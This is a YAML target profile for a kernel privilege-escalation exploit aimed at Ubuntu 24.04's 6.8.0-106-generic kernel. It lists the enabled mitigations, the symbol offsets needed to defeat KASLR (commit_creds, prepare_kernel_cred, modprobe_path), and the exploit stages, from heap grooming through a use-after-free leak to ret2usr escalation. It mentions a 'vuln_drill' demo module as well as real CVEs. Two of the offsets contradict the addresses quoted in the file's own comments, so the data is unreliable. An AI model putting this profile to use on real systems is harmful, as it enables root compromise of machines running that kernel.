name: ubuntu-24.04-x86_64
kernel_version: "6.8"
kernel_release: "6.8.0-106-generic"
mitigations:
  kpti: enabled
  kaslr: enabled
  smep: enabled
  smap: enabled
  cfi: enabled
  cet: enabled
  pac: disabled

# Symbol offsets from _printk for KASLR bypass (demo/vuln_drill).
# The exploit leaks _printk address via UAF+OOB read on vuln_drill.
symbol_offsets:
  leak_symbol: _printk
  commit_creds: -0x6fae0
  prepare_kernel_cred: -0x6f560
  init_task: 0x2458f70

# Symbol offsets from kernel_base for side-channel KASLR bypass (real CVEs).
# Side-channel finds kernel_base, then adds these offsets to compute symbols.
# Computed from /proc/kallsyms on 6.8.0-106-generic:
#   startup_64 = 0xffffffff8b000090 (kernel text base ~0xffffffff8b000000)
#   commit_creds = 0xffffffff8b1472f0, offset = 0x1472f0
#   prepare_kernel_cred = 0xffffffff8b147870, offset = 0x147870
#   modprobe_path = 0xffffffff8d7de440, offset = 0x3de440
#   loopback_dev = 0xffffffff8bd06110, offset = 0x1d06110
cve_symbol_offsets:
  kernel_base: 0x0
  commit_creds: 0x1472f0
  prepare_kernel_cred: 0x147870
  modprobe_path: 0x3de440
  loopback_dev: 0x1d06110

stages:
  prep:
    method: environment_checks
  groom:
    method: drill_alloc
  trigger:
    bug_type: uaf_oob
  leak:
    method: uaf_oob_read
  primitive:
    method: oob_write
  escalate:
    method: ret2usr
  cleanup:
    method: close_fds
recommended_primitive: oob_write
